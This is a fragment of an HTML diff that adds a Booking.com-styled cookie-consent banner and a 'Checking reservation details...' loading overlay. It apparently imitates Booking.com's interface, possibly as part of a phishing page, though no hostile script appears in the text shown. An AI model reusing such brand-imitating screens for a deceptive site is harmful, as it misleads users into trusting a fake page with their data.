+transition:transform 0.4s ease;
+z-index:999;
+box-sizing:border-box;
+">
+
+<h3 style="margin-top:0;">Manage cookie settings</h3>
+
+<div class="cookieTextScroll">
+<p style="font-size:14px; color:#444; line-height:1.6; margin:0;">
+In this application, Booking.com we, Booking.com and our partners, use the following categories of cookies (and similar technologies) that require your consent: analytical cookies and marketing cookies.
+<br>
+<br>
+Analytical cookies<br>
+We and our partners use analytical cookies to obtain information about how you use our service, information which is then used to understand how visitors like you use our platform and to improve the performance of our site and services.
+<br>
+<br>
+Marketing cookies<br>
+We and our partners use marketing cookies, including social media cookies, to collect information about your behavior on this platform, which helps us decide which products to show you on and off our platform and to display personalized content and advertisements. Booking.com and other platforms. Personalized content is based on your behavior and the services you have booked. These cookies also allow you to share or like pages on social networks.
+<br>
+<br>
+By selecting "Accept", you consent to the use of analytical and marketing cookies and the related processing of your personal data. You can update your consent for each platform at any time. For the website, via the "Manage cookie settings" option in the footer. For the app, via the "My account" > "Privacy and data management" > "Privacy settings".
+<br>
+<br>
+If you select "Decline", you will have a less personalized experience on our platform.
+<br>
+<br>
+You can find more information about the relevant processing of personal data in the Privacy Statement 
+</p>
+</div>
+
+<div style="display:flex; gap:10px; margin-top:15px;">
+  <button onclick="acceptCookies()" style="
+    flex:1;
+    padding:12px;
+    background:#0071c2;
+    color:white;
+    border:none;
+    border-radius:6px;
+    font-weight:600;
+  ">Accept</button>
+
+  <button onclick="declineCookies()" style="
+    flex:1;
+    padding:12px;
+    background:#FFCFD0;
+    border:none;
+    border-radius:6px;
+    font-weight:600;
+  ">Decline</button>
+</div>
+
+</div>
+<div id="loadingScreen" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:white;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+z-index:2000;
+opacity:0;
+pointer-events:none;
+transition:0.3s;
+">
+
+<div style="width:50px; height:50px; border:4px solid #ccc; border-top:4px solid #0071c2; border-radius:50%; animation:spin 1s linear infinite;"></div>
+
+<p style="margin-top:20px; font-size:16px; color:#333; font-weight:500;">
+Checking reservation details...
+</p>
+
+<p style="font-size:13px; color:#777;">
+Please wait, this may take a few seconds.
+</p>
+
+</div>
+</body>
+</html>
